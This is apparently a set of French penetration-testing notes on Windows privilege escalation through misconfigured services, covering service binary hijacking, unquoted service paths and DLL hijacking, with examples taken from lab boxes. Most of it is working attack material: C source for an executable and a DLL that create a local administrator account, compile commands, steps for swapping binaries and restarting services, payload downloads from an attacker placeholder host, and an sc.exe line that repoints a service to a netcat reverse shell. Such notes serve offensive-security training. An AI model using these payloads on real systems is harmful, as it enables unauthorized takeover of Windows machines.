# 03-Escalade via les Services Windows

Les services Windows mal configurés sont une source fréquente d'escalade de privilèges.

## Énumération des Services

```powershell
# Lister les services et leurs chemins d'accès
Get-CimInstance -ClassName win32_service | Select Name, State, PathName, StartMode | Format-List
wmic service get name, displayname, pathname, startmode
sc qc "NomDuService" # Pour un service spécifique

# Utiliser PowerUp pour trouver les services vulnérables
# powershell -ep bypass
# . .\PowerUp.ps1
# Get-ModifiableServiceFile
# Get-ModifiableService
# Invoke-AllChecks
```

## Détournement de Binaire de Service (Service Binary Hijacking)
> Remplacer un binaire de service par un binaire malveillant lorsque les permissions le permettent.

**1. Identifier les Services Vulnérables**
Recherchez les services dont le binaire est dans un répertoire où vous avez des droits d'écriture.

```powershell
# Vérifier les permissions sur le binaire du service
icacls "C:\chemin\vers\service.exe"
# Exemple : BUILTIN\Users:(F) ou VotreUtilisateur:(F) ou (M)
```
Exemple de service XAMPP MySQL (tiré de `04-things-to-add.md`):
```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# ...
# mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
# C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
#                               BUILTIN\Administrators:(F)
#                               BUILTIN\Users:(F) <---------- Important
```
Ici, `BUILTIN\Users` a un accès complet (F).

**2. Créer un Binaire Malveillant**
Par exemple, un binaire qui ajoute un utilisateur aux administrateurs.
```c
// adduser.c
#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user nomutilisateur motdepasse /add");
  i = system ("net localgroup administrators nomutilisateur /add");
  return 0;
}
```
Compiler :
```bash
# Sur Kali
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

**3. Remplacer le Binaire et Redémarrer le Service**
```powershell
# Sauvegarder l'original (optionnel mais recommandé)
move "C:\chemin\vers\service.exe" "C:\chemin\vers\service.exe.bak"
# Transférer et remplacer le binaire
# (Ex: iwr -uri http://<IP_ATTAQUANT>/adduser.exe -Outfile "C:\chemin\vers\service.exe")
copy C:\temp\adduser.exe "C:\chemin\vers\service.exe"

# Tenter de redémarrer le service
net stop NomDuService
net start NomDuService
# Ou via PowerShell
Stop-Service -Name "NomDuService"
Start-Service -Name "NomDuService"
```

**Si le redémarrage est refusé (Access Denied) :**
Vérifiez le mode de démarrage du service. S'il est en "Auto", un redémarrage du système déclenchera le payload.
```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
# mysql Auto
PS C:\Users\dave> whoami /priv # Vérifier SeShutdownPrivilege
# ...
# SeShutdownPrivilege           Shut down the system                 Disabled # ou Enabled
PS C:\Users\dave> shutdown /r /t 0 # Si le privilège est présent
```

**Automatisation avec PowerUp**
```powershell
# Sur la machine cible après avoir chargé PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'NomDuServiceCible' # Tente d'abuser automatiquement
# Si Install-ServiceBinary échoue, procéder manuellement comme décrit ci-dessus.
```

**Exemple de Box (Return - Modification de binaire de service)**
```bash
# Uploader nc.exe
# sc.exe config <NOM_SERVICE> binPath="C:\chemin\vers\nc.exe -e cmd.exe <IP_ATTAQUANT> <PORT>"
# sc.exe stop <NOM_SERVICE>
# sc.exe start <NOM_SERVICE>
```

## Chemins de Service non Quotés (Unquoted Service Paths)
> Les services avec des chemins non quotés contenant des espaces peuvent être exploités en plaçant un exécutable malveillant dans le chemin.

**1. Identifier les Chemins de Service non Quotés**
```powershell
# Avec wmic (plus fiable pour les guillemets)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
# Exemple de sortie :
# GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
Le chemin `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe` n'est pas quoté. Windows essaiera d'exécuter :
1.  `C:\Program.exe`
2.  `C:\Program Files\Enterprise.exe`
3.  `C:\Program Files\Enterprise Apps\Current.exe`
4.  `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`

**2. Vérifier les Permissions d'Écriture**
Vérifiez si vous pouvez écrire dans l'un des chemins interprétés (par exemple, `C:\Program Files\Enterprise Apps\`).
```powershell
# Exemple pour "C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe"
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps" # BUILTIN\Users:(OI)(CI)(RX,W) -> Bingo!
```

**3. Placer l'Exécutable Malveillant**
Créez `adduser.exe` (comme dans la section précédente) et placez-le dans le chemin exploitable.
Si le chemin vulnérable est `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`, et que vous avez les droits d'écriture dans `C:\Program Files\Enterprise Apps\`, vous pouvez placer `Current.exe`.

```powershell
# Transférer adduser.exe en tant que Current.exe
# iwr -uri http://<IP_ATTAQUANT>/adduser.exe -Outfile "C:\Program Files\Enterprise Apps\Current.exe"
copy C:\temp\adduser.exe "C:\Program Files\Enterprise Apps\Current.exe"
```

**4. Redémarrer le Service (ou le Système)**
```powershell
# Tenter de redémarrer le service
Stop-Service GammaService
Start-Service GammaService
# Si cela échoue ou si les permissions sont insuffisantes, un redémarrage du système peut être nécessaire si le service démarre automatiquement.
```

**Automatisation avec PowerUp**
```powershell
# Sur la machine cible après avoir chargé PowerUp.ps1
Get-UnquotedService
# Ou Write-ServiceBinary -Name 'NomDuService' -Path "C:\Program Files\Enterprise Apps\Current.exe" # (si PowerUp le suggère)
# Puis redémarrer le service
Restart-Service NomDuService
```

## Détournement de DLL (DLL Hijacking) pour les Services
> Remplacer ou ajouter des DLL qui sont chargées par un service privilégié.

#### Énumeration
Check des applications installées sur le systeme:
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
Ensuite naviguer dans le répertoire **C:\tools\Procmon\** et double-click sur **Procmon64.exe**

**1. Identifier les Applications/Services Vulnérables**
Utilisez Process Monitor (ProcMon) de Sysinternals pour identifier les DLL manquantes qu'un service tente de charger.
Filtres ProcMon :
*   `Process Name` is `service.exe` (ou le nom du processus du service)
*   `Path` ends with `.dll`
*   `Result` is `NAME NOT FOUND`

Exemple (FileZilla - bien que ce soit une application de bureau, le principe s'applique aux services) :
L'application tente de charger `TextShaping.dll` depuis son répertoire d'installation.

**2. Vérifier les Permissions d'Écriture**
Vérifiez si vous avez des droits d'écriture dans le répertoire où la DLL est recherchée (par exemple, le répertoire du service, ou un chemin dans le PATH système si la DLL n'est pas trouvée localement).
```powershell
# echo "test" > 'C:\Chemin\Vers\RepertoireService\test.txt'
# type 'C:\Chemin\Vers\RepertoireService\test.txt'
```

**3. Créer une DLL Malveillante**
```c
// malicious_dll.c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user nomutilisateur motdepasse /add");
            system("net localgroup administrators nomutilisateur /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```
Compiler (nommer la DLL comme celle qui est recherchée, ex: `TextShaping.dll`) :
```bash
# Sur Kali
x86_64-w64-mingw32-gcc malicious_dll.c --shared -o TextShaping.dll
```

**4. Placer la DLL et Redémarrer le Service**
```powershell
# Transférer la DLL malveillante dans le répertoire approprié
# iwr -uri http://<IP_ATTAQUANT>/TextShaping.dll -OutFile 'C:\Chemin\Vers\RepertoireService\TextShaping.dll'

# Redémarrer le service (ou attendre qu'il soit redémarré/que l'application soit lancée)
Stop-Service NomDuService
Start-Service NomDuService
```
Si le service s'exécute avec des privilèges élevés, votre code dans la DLL sera exécuté avec ces privilèges.

## Exploitation des Services Mal Configurés (Permissions)
Ceci est souvent un synonyme de "Détournement de Binaire de Service" où les permissions sur le fichier binaire du service lui-même sont trop laxistes.

Exemple (Arctic - Box) :
```bash
# Identifier les services vulnérables (chemins, mode de démarrage)
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Vérifier les permissions sur les binaires de service
icacls "C:\chemin\vers\service.exe"
# Si vous avez des droits d'écriture, procédez comme pour le "Détournement de Binaire de Service".
``` 
